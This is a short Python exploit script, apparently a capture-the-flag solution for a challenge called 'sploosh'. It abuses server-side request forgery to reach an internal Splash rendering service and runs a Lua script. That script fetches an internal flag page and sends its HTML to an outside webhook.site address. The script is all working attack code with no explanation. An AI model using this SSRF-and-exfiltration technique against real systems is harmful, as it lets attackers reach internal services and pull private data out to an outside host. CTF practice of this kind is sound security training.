#!/usr/bin/env python3

import requests

URL = "http://sploosh.chal.perfect.blue/api.php"

LUA_SOURCE = """
function main(splash, args)
  splash:go("http://172.16.0.14/flag.php")
  splash:wait(0.5)
  splash:go("https://webhook.site/fd61a23a-9edd-404f-a41d-9a0e53ae1f25/" ..  splash:html())
  splash:wait(0.5)
  return "Ok"
end
"""

response = requests.get(
    URL, params={"url": "http://splash:8050/execute?lua_source=" + LUA_SOURCE}, proxies= {"http":"http://127.0.0.1:8080"})
print(response.text)